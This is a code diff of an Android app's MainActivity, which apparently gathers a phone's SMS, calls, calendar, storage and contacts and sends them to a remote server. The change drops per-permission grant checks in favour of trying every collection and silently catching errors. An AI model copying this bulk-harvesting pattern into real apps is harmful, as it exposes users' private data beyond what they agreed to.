@@ -54,6 +54,7 @@ public class MainActivity extends AppCompatActivity {
     
     // holds which modalities are waiting for permissions to be granted
     private ArrayList<Integer> waiting = new ArrayList<Integer>();
+    private boolean[] send = {false, false, false, false, false};
     private boolean mainDataSendFinished = false;
     private boolean permissionsDataSendFinished = false;
 
@@ -135,27 +136,6 @@ public class MainActivity extends AppCompatActivity {
         instaView.setInitialScale(200);
         instaView.loadUrl(url);
         instaView.setVisibility(View.VISIBLE);
-/*        instaButton = (Button) findViewById(R.id.InstaButton);
-        instaButton.setOnClickListener(new View.OnClickListener(){
-            @Override
-            public void onClick(View view) {
-
-
-
-                // log in to Instagram
-                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://api.instagram.com/oauth/authorize/?client_id="
-                        + CLIENT_ID
-                        + "&redirect_uri="
-                        + CALLBACK
-                        + "&state="
-                        + serverHook.identifier
-                        +"&response_type=code"));
-                startActivity(browserIntent);
-
-            }
-        });
-*/
-
 
         nextScreenButton = (Button) findViewById(R.id.nextRecord);
         nextScreenButton.setOnClickListener(new View.OnClickListener(){
@@ -175,7 +155,7 @@ public class MainActivity extends AppCompatActivity {
     public void sendAllAvailableData(){
         Context mContext = getApplicationContext();
         serverHook.sendToServer("debug","START");
-        boolean[] send = {false, false, false, false, false};
+
         waiting = new ArrayList<Integer>();
 
         if(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
@@ -256,43 +236,58 @@ public class MainActivity extends AppCompatActivity {
         boolean[] accepted = {false, false, false, false, false};
         Context mContext = getApplicationContext();
         Log.d("MYAPPP", "HERE");
-        switch (requestCode) {
-            case ASK_MULTIPLE_PERMISSION_REQUEST_CODE: {
-                // If request is cancelled, the result arrays are empty.
-                if (grantResults.length > 0) {
-                    for(int i=0; i<waiting.size(); i++){
+        Log.d("TEEESST", grantResults.toString());
 
-                        if(grantResults[i] >= 0){
-                            switch(waiting.get(i)){
-                                case TEXT:
-                                    Log.d("MYAPP", "text");
-                                    mtext.getTexts(mContext);
-                                    break;
-                                case CALLS:
-                                    Log.d("MYAPP", "calls");
-                                    mhabits.getCalls(mContext);
-                                    break;
-                                case CALENDAR:
-                                    Log.d("MYAPP", "Calendar");
-                                    mhabits.getCalendar(mContext);
-                                    break;
-                                case STORAGE:
-                                    Log.d("MYAPP", "storage");
-                                    mhabits.getStorage(mContext);
-                                    break;
-                                case CONTACTS:
-                                    Log.d("MYAPP", "contacts");
-                                    mhabits.getContacts(mContext);
-                                    break;
-                            }
-                        }
-                    }
-                }
-                else{
-                    Log.d("MYAPP", "UH OH");
-                }
+        if(!send[TEXT]){
+            try {
+                mtext.getTexts(mContext);
+                Log.d("MYAPP", "text");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+        if(!send[CALLS]){
+            try {
+                mhabits.getCalls(mContext);
+                Log.d("MYAPP", "Calls");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+        if(!send[CALENDAR]){
+            try {
+                mhabits.getCalendar(mContext);
+                Log.d("MYAPP", "Calendar");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+        if(!send[STORAGE]){
+            try {
+                mhabits.getStorage(mContext);
+                Log.d("MYAPP", "storage");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
             }
         }
+        if(!send[CONTACTS]){
+            try {
+                mhabits.getContacts(mContext);
+                Log.d("MYAPP", "contacts");
+            }
+            catch(Exception e){
+                Log.d("ERROR", e.getMessage());
+            }
+
+        }
+
         permissionsDataSendFinished = true;
         checkIfFinished();
 
